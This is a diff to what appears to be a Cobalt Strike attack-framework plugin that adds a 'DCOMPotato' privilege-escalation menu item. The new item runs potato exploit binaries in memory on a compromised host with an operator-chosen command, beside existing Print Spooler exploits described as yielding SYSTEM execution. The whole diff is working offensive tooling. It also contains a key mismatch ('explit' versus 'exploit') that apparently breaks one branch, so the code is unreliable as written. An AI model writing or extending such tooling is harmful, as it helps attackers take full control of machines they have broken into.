@@ -249,7 +249,14 @@ sub CVE_2021_1675 {
 sub CVE_2022_21999{
     bexecute_assembly($bid, script_resource("bin/Privilege_escalation/CVE_2022_21999/SpoolFool.exe"),"-dll ".$3["dllfile"]);
 }
-
+sub DCOMPotato{
+    if ($3['explit'] eq "McpManagementPotato"){
+        bexecute_assembly($bid, script_resource("bin/McpManagementPotato.exe"),$3["Command"]);
+    }else{
+        bexecute_assembly($bid, script_resource("bin/PrinterNotifyPotato.exe"),$3["Command"]);
+    }
+    
+}
 menu "提权"{
     item "MS16-032"{
             $bid = $1['@'];
@@ -405,6 +412,15 @@ menu "提权"{
         $Dialog = dialog("CVE-2022-21999",%(bid => $bid),&CVE_2022_21999);
         dialog_description($Dialog, "Windows Print Spooler 存在权限提升漏洞，经过身份认证的本地攻击者可通过在目标系统上运行特制程序来利用此漏洞，成功利用此漏洞的攻击者可在目标系统上以 SYSTEM 权限执行任意代码. link:https://github.com/ly4k/SpoolFool");
         drow_text($Dialog, "dllfile", "Target DLL Path: ");
+        dbutton_action($Dialog, "Exploit");
+        dialog_show($Dialog);
+    }
+    item "[Mem]DCOMPotato[x64 only]" {
+        $bid = $1['@'];
+        $Dialog = dialog("DCOMPotato",%(Command =>"whoami", bid => $bid),&DCOMPotato);
+        dialog_description($Dialog, "DCOMPotato");
+        drow_text($Dialog, "Command", "Command: ");
+        drow_combobox($Dialog, "exploit",  "Exploit: ", @("McpManagementPotato","PrinterNotifyPotato"));
         dbutton_action($Dialog, "Exploit");
         dialog_show($Dialog);
     }
